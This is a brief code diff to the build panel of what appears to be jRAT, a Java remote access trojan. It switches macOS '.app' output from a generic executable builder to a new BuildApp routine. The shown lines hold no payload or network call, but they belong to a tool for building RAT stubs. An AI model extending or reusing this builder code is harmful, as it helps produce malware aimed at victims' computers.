@@ -30,6 +30,7 @@ import su.jrat.client.ShellcodeGenerator;
 import su.jrat.client.addons.PluginList;
 import su.jrat.client.addons.StubPlugin;
 import su.jrat.client.build.Build;
+import su.jrat.client.build.BuildApp;
 import su.jrat.client.build.BuildExecutable;
 import su.jrat.client.listeners.AdvancedBuildListener;
 import su.jrat.client.settings.Settings;
@@ -256,7 +257,7 @@ public class PanelBuildFinal extends JPanel {
 							file = file + ".app";
 						}
 
-						BuildExecutable.build(temp.getAbsolutePath(), file, out.frameExecutableInfo);
+						BuildApp.build(temp.getAbsolutePath(), file, out.frameAppInfo);
 
 						temp.delete();
 					} else {				
